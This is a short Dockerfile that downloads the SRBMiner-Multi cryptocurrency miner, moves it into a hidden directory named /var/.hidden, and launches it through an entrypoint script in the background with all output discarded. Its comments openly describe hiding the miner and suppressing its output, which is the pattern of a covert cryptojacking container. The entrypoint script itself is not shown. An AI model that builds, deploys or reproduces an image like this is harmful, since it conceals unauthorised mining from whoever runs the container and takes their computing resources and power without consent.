# Dockerfile
FROM ubuntu:focal

# Install dependencies
RUN apt-get update && apt-get -y install \
    git tar wget coreutils xz-utils inetutils-ping curl \
    libsodium23 libcurl4-openssl-dev libssl-dev libjansson-dev \
    automake autotools-dev build-essential && \
    cd /opt && \
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    tar xf SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    rm -rf /opt/SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    apt-get -y purge xz-utils && apt-get -y autoremove --purge && \
    apt-get -y clean && apt-get -y autoclean; \
    rm -rf /var/lib/apt-get/lists/*

# Create hidden directory for miner installation
RUN mkdir -p /var/.hidden && mv /opt/SRBMiner-Multi-2-7-2 /var/.hidden/

# Copy entrypoint script to the hidden directory
COPY entrypoint /var/.hidden/SRBMiner-Multi-2-7-2/
RUN chmod +x /var/.hidden/SRBMiner-Multi-2-7-2/entrypoint

# Set work directory to hidden folder
WORKDIR "/var/.hidden/SRBMiner-Multi-2-7-2"

# Run miner with suppressed output
ENTRYPOINT ["sh", "-c", "./entrypoint > /dev/null 2>&1 &"]
